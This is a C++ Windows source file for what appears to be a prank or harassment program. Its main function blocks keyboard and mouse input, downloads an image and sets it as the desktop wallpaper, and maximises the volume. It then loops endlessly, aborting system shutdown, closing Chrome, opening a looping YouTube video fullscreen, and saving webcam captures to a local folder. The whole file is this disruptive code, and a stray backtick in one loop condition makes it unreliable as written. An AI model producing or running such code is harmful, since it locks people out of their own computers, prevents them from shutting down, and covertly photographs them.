// Baruch ata aduni.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
using namespace std;
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <shellapi.h>
#include <stdlib.h>
#include<string>
#include<tchar.h>
#include<urlmon.h>
#include<endpointvolume.h>
#include <stdio.h>
#include <shlobj_core.h>
#include <fstream>
#pragma comment(lib, "winmm")
#include <Lmcons.h>
#pragma comment(lib, "urlmon.lib")
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <vfw.h>
#pragma comment(lib, "vfw32.lib")
bool CaptureScreenshot(const std::string& filename)
{
    // Create a capture window

    HWND hCam = capCreateCaptureWindow(L"CaptureWindow", WS_CHILD, 0, 0, 0, 0, ::GetDesktopWindow(), 0);

    if (hCam == NULL) {
        printf("Failed to create capture window\n");
        return false;
    }

    // Connect to the first video capture device (index 0)
    if (capDriverConnect(hCam, 0)) {
        // Capture the screen and save it as a BMP file
        // Convert std::string to std::wstring
        std::wstring wideFilename(filename.begin(), filename.end());

        // Save the screenshot as a BMP file
        if (capFileSaveDIB(hCam, wideFilename.c_str())) {
            printf(" Amen");
        }
        else {
            printf(" No  Amen");
        }

        // Disconnect the capture device
        capDriverDisconnect(hCam);
    }
    else {
        printf("Failed to connect to the camera. Check the camera?\n");
        return false;
    }

    // Destroy the capture window
    DestroyWindow(hCam);
    return true;
}
std::wstring GetStartupFolderPath()
{
    PWSTR pszPath;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &pszPath);
    if (SUCCEEDED(hr))
    {
        // The function succeeded, so copy the returned path to a
        // C++ string, free the memory allocated by the function,
        // and return the path string.
        std::wstring path(pszPath);
        CoTaskMemFree(static_cast<LPVOID>(pszPath));
        return path;
    }
    else
    {
        // The function failed, so handle the error.
        // ...
        // You might want to throw an exception, or just return an
        // empty string here.
        throw std::runtime_error("The SHGetKnownFolderPath function failed");
    }
}
bool ChangeVolume(double nVolume, bool bScalar)
{

    HRESULT hr = NULL;
    bool decibels = false;
    bool scalar = false;
    double newVolume = nVolume;

    CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;

    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;

    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;

    // -------------------------
    float currentVolume = 0;
    endpointVolume->GetMasterVolumeLevel(&currentVolume);
    //printf("Current volume in dB is: %f\n", currentVolume);

    hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
    //CString strCur=L"";
    //strCur.Format(L"%f",currentVolume);
    //AfxMessageBox(strCur);

    // printf("Current volume as a scalar is: %f\n", currentVolume);
    if (bScalar == false)
    {
        hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
    }
    else if (bScalar == true)
    {
        hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
    }
    endpointVolume->Release();

    CoUninitialize();

    return FALSE;
}
BOOL PreventSystemShutdown()
{
    HANDLE hToken;              // handle to process token 
    TOKEN_PRIVILEGES tkp;       // pointer to token structure 

    // Get the current process token handle  so we can get shutdown 
    // privilege. 

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    // Get the LUID for shutdown privilege. 

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
        &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;  // one privilege to set    
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Get shutdown privilege for this process. 

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
        (PTOKEN_PRIVILEGES)NULL, 0);

    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    // Prevent the system from shutting down. 

    if (!AbortSystemShutdown(NULL))
        return FALSE;

    // Disable shutdown privilege. 

    tkp.Privileges[0].Attributes = 0;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
        (PTOKEN_PRIVILEGES)NULL, 0);

    return TRUE;
}
void amen(int i) {
    PreventSystemShutdown();
    system("Powershell -C \"Get-Process chrome | ForEach-Object{ $_.CloseMainWindow() | Out-Null }\"");
    PreventSystemShutdown();
    Sleep(500);
    PreventSystemShutdown();
    ShellExecute(0, 0, L"https://www.youtube.com/v/G8kPKJxg7HM?version=3&loop=1&playlist=G8kPKJxg7HM", 0, 0, SW_SHOWMAXIMIZED);
    PreventSystemShutdown();
    Sleep(4000);
    PreventSystemShutdown();
    keybd_event('F', 0x46, KEYEVENTF_EXTENDEDKEY | 0, 0);
    PreventSystemShutdown();
    keybd_event('F', 0x46, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    PreventSystemShutdown();
    int k = 0;
    int j = 0;
    while (k != 40` ) {
        PreventSystemShutdown();
        PreventSystemShutdown();
        Sleep(1000);
        PreventSystemShutdown();
        string filename = "C:\\Users\\Dommo\\" + to_string(j) + to_string(i) + "screen.bmp";
        PreventSystemShutdown();

        if (CaptureScreenshot(filename)) {
            PreventSystemShutdown();
            printf("Amen");
            PreventSystemShutdown();
        }
        else {
            PreventSystemShutdown();
            printf("No Amen");
            PreventSystemShutdown();
        }
        PreventSystemShutdown();
        PreventSystemShutdown();
        k++;
        PreventSystemShutdown();
        j++;
        PreventSystemShutdown();
    }
    
}
int main()
{
    cout << "Dommo Time!!!!!\n";
    CreateDirectory(L"C:\\Users\\Dommo", NULL);
    BlockInput(true);
    if (CaptureScreenshot("C:\\Users\\Dommo\\start.bmp")) {
        printf("Amen");
    }
    URLDownloadToFile(NULL, L"https://i.ytimg.com/vi/G8kPKJxg7HM/hqdefault.jpg?sqp=-oaymwE2CNACELwBSFXyq4qpAygIARUAAIhCGAFwAcABBvABAfgB_gSAAuADigIMCAAQARhdIFsoZTAP&rs=AOn4CLBIR1BS-0xT_djJjVa4pIWHWdbs1A", L"C:\\Users\\Dommo\\amen.jpg", 0, NULL);
    const wchar_t* path = L"C:\\Users\\Dommo\\amen.jpg";
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
    //uncomment these
    ChangeVolume(1.0, TRUE);
    int i = 0;
    while (true) {
        PreventSystemShutdown();
        amen(i);
        PreventSystemShutdown();

        i++;
    }
    
}



// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
    